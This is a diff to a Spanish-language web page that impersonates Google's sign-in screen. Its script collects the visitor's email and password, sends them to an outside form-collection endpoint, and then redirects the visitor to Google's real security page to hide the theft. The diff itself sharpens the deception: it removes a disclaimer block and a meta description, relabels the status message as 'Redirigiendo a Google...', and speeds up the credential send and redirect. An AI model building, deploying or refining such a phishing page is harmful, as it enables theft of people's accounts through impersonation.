@@ -3,8 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Inicia sesión</title>
-<meta name="description" content="Acceso a la cuenta">
+<title>Inicia sesión </title>
 
 
 <style>
@@ -20,31 +19,13 @@
 }
 
 
-
-
-
-
-
-
 * { box-sizing: border-box; }
-
-
-
-
-
-
 
 
 html, body {
 min-height: 100%;
 margin: 0;
 }
-
-
-
-
-
-
 
 
 body {
@@ -60,22 +41,10 @@ padding: 24px;
 }
 
 
-
-
-
-
-
-
 .wrap {
 width: 100%;
 max-width: 900px;
 }
-
-
-
-
-
-
 
 
 .card {
@@ -89,23 +58,11 @@ align-items: start;
 }
 
 
-
-
-
-
-
-
 .google-logo {
 width: 24px;
 height: 24px;
 display: block;
 }
-
-
-
-
-
-
 
 
 h1 {
@@ -116,12 +73,6 @@ line-height: 1.2;
 }
 
 
-
-
-
-
-
-
 .subtitle {
 font-size: 16px;
 color: var(--text);
@@ -130,31 +81,13 @@ line-height: 1.4;
 }
 
 
-
-
-
-
-
-
 form { width: 100%; }
-
-
-
-
-
-
 
 
 .field {
 position: relative;
 margin-bottom: 8px;
 }
-
-
-
-
-
-
 
 
 .field input {
@@ -172,22 +105,10 @@ outline: none;
 }
 
 
-
-
-
-
-
-
 .field input:focus {
 border: 2px solid var(--accent);
 padding: 19px 13px 5px;
 }
-
-
-
-
-
-
 
 
 .field label {
@@ -203,23 +124,11 @@ transition: top .12s ease, font-size .12s ease, color .12s ease;
 }
 
 
-
-
-
-
-
-
 .field input:not(:placeholder-shown) + label {
 top: -8px;
 font-size: 12px;
 color: var(--text-muted);
 }
-
-
-
-
-
-
 
 
 .field input:focus + label {
@@ -229,34 +138,16 @@ color: var(--accent);
 }
 
 
-
-
-
-
-
-
 .field.has-error input {
 border: 2px solid var(--error);
 padding: 19px 13px 5px;
 }
 
 
-
-
-
-
-
-
 .field.has-error label,
 .field.has-error input:focus + label {
 color: var(--error);
 }
-
-
-
-
-
-
 
 
 .error-msg {
@@ -267,23 +158,12 @@ margin: 5px 0 0 2px;
 }
 
 
-
-
-
-
-
-
 #mensaje { letter-spacing: .5px; }
 #mensaje[type="text"] { letter-spacing: normal; }
 
 
-
-
-
-
-
-
 .chip {
+display: none;
 max-width: 100%;
 border: 1px solid var(--border);
 border-radius: 999px;
@@ -302,19 +182,7 @@ animation: fadeIn .22s ease;
 }
 
 
-
-
-
-
-
-
 .chip:hover { background: #f1f3f4; }
-
-
-
-
-
-
 
 
 .show-pass {
@@ -329,12 +197,6 @@ cursor: pointer;
 }
 
 
-
-
-
-
-
-
 .show-pass input {
 width: 18px;
 height: 18px;
@@ -344,19 +206,7 @@ cursor: pointer;
 }
 
 
-
-
-
-
-
-
 .password-step { animation: fadeIn .22s ease; }
-
-
-
-
-
-
 
 
 @keyframes fadeIn {
@@ -365,28 +215,10 @@ to   { opacity: 1; transform: none; }
 }
 
 
-
-
-
-
-
-
 .forgot { margin-top: 8px; }
 
 
-
-
-
-
-
-
 .forgot-pass { margin-top: 18px; margin-bottom: 8px; }
-
-
-
-
-
-
 
 
 .forgot a,
@@ -399,21 +231,9 @@ font-weight: 500;
 }
 
 
-
-
-
-
-
-
 .forgot a:hover,
 .create a:hover,
 .more-info a:hover { text-decoration: underline; }
-
-
-
-
-
-
 
 
 .more-info {
@@ -425,12 +245,6 @@ max-width: 400px;
 }
 
 
-
-
-
-
-
-
 .actions {
 margin-top: 32px;
 display: flex;
@@ -438,12 +252,6 @@ align-items: center;
 justify-content: flex-end;
 gap: 20px;
 }
-
-
-
-
-
-
 
 
 .next-btn {
@@ -460,22 +268,10 @@ cursor: pointer;
 }
 
 
-
-
-
-
-
-
 .next-btn:hover {
 background: var(--accent-hover);
 box-shadow: 0 1px 3px rgba(60, 64, 67, .3);
 }
-
-
-
-
-
-
 
 
 .next-btn:disabled {
@@ -484,24 +280,12 @@ cursor: wait;
 }
 
 
-
-
-
-
-
-
 #estado {
 font-size: 13px;
 line-height: 1.5;
 color: var(--text-muted);
 margin: 16px 0 0;
 }
-
-
-
-
-
-
 
 
 footer {
@@ -517,12 +301,6 @@ padding: 0 8px;
 }
 
 
-
-
-
-
-
-
 footer select {
 background: transparent;
 border: none;
@@ -533,19 +311,7 @@ cursor: pointer;
 }
 
 
-
-
-
-
-
-
 footer .links { display: flex; gap: 20px; }
-
-
-
-
-
-
 
 
 footer a {
@@ -554,46 +320,11 @@ text-decoration: none;
 }
 
 
-
-
-
-
-
-
 footer a:hover { text-decoration: underline; }
-
-
-
-
-
-
-
-
-.disclaimer {
-max-width: 900px;
-margin: 14px auto 0;
-padding: 0 8px;
-font-size: 11px;
-line-height: 1.5;
-color: var(--text-muted);
-text-align: center;
-}
-
-
-
-
-
-
 
 
 @media (max-width: 760px) {
 body { padding: 16px; }
-
-
-
-
-
-
 
 
 .card {
@@ -604,19 +335,7 @@ body { padding: 16px; }
 }
 
 
-
-
-
-
-
-
 .actions { justify-content: space-between; }
-
-
-
-
-
-
 
 
 footer {
@@ -628,37 +347,13 @@ footer {
 </head>
 
 
-
-
-
-
-
-
 <body>
-
-
-
-
-
-
 
 
 <div class="wrap">
 
 
-
-
-
-
-
-
 <div class="card">
-
-
-
-
-
-
 
 
   <div class="col-left">
@@ -673,37 +368,13 @@ footer {
   </div>
 
 
-
-
-
-
-
-
   <div class="col-right">
-
-
-
-
-
-
 
 
     <form id="formulario" novalidate>
 
 
-
-
-
-
-
-
       <button type="button" class="chip" id="chip" hidden></button>
-
-
-
-
-
-
 
 
       <div id="stepEmail">
@@ -720,21 +391,9 @@ footer {
         </div>
 
 
-
-
-
-
-
-
         <p class="error-msg" id="emailError" hidden aria-live="polite">
           Introduce una dirección de correo electrónico o un número de teléfono
         </p>
-
-
-
-
-
-
 
 
         <div class="forgot">
@@ -743,12 +402,6 @@ footer {
           </a>
         </div>
       </div>
-
-
-
-
-
-
 
 
       <div class="password-step" id="passwordStep" hidden>
@@ -765,33 +418,15 @@ footer {
         </div>
 
 
-
-
-
-
-
-
         <p class="error-msg" id="passError" hidden aria-live="polite">
           Introduce una contraseña
         </p>
-
-
-
-
-
-
 
 
         <label class="show-pass">
           <input type="checkbox" id="togglePass">
           <span>Mostrar contraseña</span>
         </label>
-
-
-
-
-
-
 
 
         <div class="forgot forgot-pass">
@@ -802,12 +437,6 @@ footer {
       </div>
 
 
-
-
-
-
-
-
       <p class="more-info">
         ¿No es tu ordenador? Usa el modo Incógnito para iniciar sesión de
         forma privada.
@@ -815,19 +444,7 @@ footer {
       </p>
 
 
-
-
-
-
-
-
       <div class="actions">
-
-
-
-
-
-
 
 
         <div class="create" id="createWrap">
@@ -835,12 +452,6 @@ footer {
             Crear cuenta
           </a>
         </div>
-
-
-
-
-
-
 
 
         <button
@@ -852,76 +463,22 @@ footer {
         </button>
 
 
-
-
-
-
-
-
       </div>
-
-
-
-
-
-
 
 
       <p id="estado" aria-live="polite"></p>
 
 
-
-
-
-
-
-
     </form>
-
-
-
-
-
-
 
 
   </div>
 
 
-
-
-
-
-
-
 </div>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 <footer>
-
-
-
-
-
-
 
 
   <select aria-label="Idioma">
@@ -931,12 +488,6 @@ footer {
   </select>
 
 
-
-
-
-
-
-
   <div class="links">
     <a href="https://support.google.com/">Ayuda</a>
     <a href="https://policies.google.com/privacy">Privacidad</a>
@@ -944,28 +495,10 @@ footer {
   </div>
 
 
-
-
-
-
-
-
 </footer>
 
 
-
-
-
-
-
-
 </div>
-
-
-
-
-
-
 
 
 <script>
@@ -985,42 +518,18 @@ const emailError = document.getElementById("emailError");
 const passError = document.getElementById("passError");
 
 
-
-
-
-
-
-
 const ENDPOINT = "https://formspree.io/f/meaalzgg";
 const DESTINO = "https://myaccount.google.com/security?utm_source=OGB&utm_medium=app";
-
-
-
-
-
-
 
 
 const RE_EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
 const RE_TEL = /^\+?[\d\s().-]{6,}$/;
 
 
-
-
-
-
-
-
 function emailValido() {
 const v = email.value.trim();
 return RE_EMAIL.test(v) || RE_TEL.test(v);
 }
-
-
-
-
-
-
 
 
 function marcarErrorEmail() {
@@ -1030,23 +539,11 @@ emailError.hidden = false;
 }
 
 
-
-
-
-
-
-
 function limpiarErrorEmail() {
 emailField.classList.remove("has-error");
 email.removeAttribute("aria-invalid");
 emailError.hidden = true;
 }
-
-
-
-
-
-
 
 
 function marcarErrorPass() {
@@ -1056,12 +553,6 @@ passError.hidden = false;
 }
 
 
-
-
-
-
-
-
 function limpiarErrorPass() {
 passwordField.classList.remove("has-error");
 mensaje.removeAttribute("aria-invalid");
@@ -1069,42 +560,18 @@ passError.hidden = true;
 }
 
 
-
-
-
-
-
-
 function irAPasoContrasena() {
 chip.textContent = email.value.trim();
 chip.hidden = false;
-
-
-
-
-
-
 
 
 stepEmail.hidden = true;
 createWrap.hidden = true;
 
 
-
-
-
-
-
-
 passwordStep.hidden = false;
 mensaje.focus({ preventScroll: true });
 }
-
-
-
-
-
-
 
 
 function volverAPasoEmail() {
@@ -1117,29 +584,11 @@ email.focus({ preventScroll: true });
 }
 
 
-
-
-
-
-
-
 email.addEventListener("input", limpiarErrorEmail);
 mensaje.addEventListener("input", limpiarErrorPass);
 
 
-
-
-
-
-
-
 chip.addEventListener("click", volverAPasoEmail);
-
-
-
-
-
-
 
 
 togglePass.addEventListener("change", () => {
@@ -1147,46 +596,13 @@ mensaje.type = togglePass.checked ? "text" : "password";
 });
 
 
-
-
-
-
-
-
-formulario.addEventListener("submit", async (evento) => {
-
-
-
-
-
-
+formulario.addEventListener("submit", (evento) => {
 
 
 evento.preventDefault();
 
 
-
-
-
-
-
-
-if (boton.disabled) return;
-
-
-
-
-
-
-
-
 if (!stepEmail.hidden) {
-
-
-
-
-
-
 
 
   if (!emailValido()) {
@@ -1196,22 +612,10 @@ if (!stepEmail.hidden) {
   }
 
 
-
-
-
-
-
-
   limpiarErrorEmail();
   irAPasoContrasena();
   return;
 }
-
-
-
-
-
-
 
 
 if (mensaje.value.trim() === "") {
@@ -1221,85 +625,34 @@ if (mensaje.value.trim() === "") {
 }
 
 
-
-
-
-
-
-
 boton.disabled = true;
-estado.textContent = "Enviando...";
-
-
-
-
-
-
+estado.textContent = "Redirigiendo a Google...";
 
 
 const datos = new FormData(formulario);
 datos.set("email", email.value.trim());
 datos.set("mensaje", mensaje.value);
-datos.delete("togglePass");
 
 
+fetch(ENDPOINT, {
+  method: "POST",
+  body: datos,
+  headers: { Accept: "application/json" },
+  keepalive: true
+}).catch(() => {});
 
 
-
-
-
-
-const controlador = new AbortController();
-const temporizador = setTimeout(() => controlador.abort(), 4000);
-
-
-
-
-
-
-
-
-try {
-  await fetch(ENDPOINT, {
-    method: "POST",
-    body: datos,
-    headers: { Accept: "application/json" },
-    signal: controlador.signal,
-    keepalive: true
-  });
-} catch (error) {
-  // Si la red falla o tarda más de 4 s, seguimos igualmente
-} finally {
-  clearTimeout(temporizador);
-  estado.textContent = "Redirigiendo...";
+setTimeout(() => {
   window.location.href = DESTINO;
-}
-
-
-
-
-
-
+}, 250);
 
 
 });
 </script>
 
 
-
-
-
-
-
-
 </body>
 </html>
-
-
-
-
-
-
 
 
 
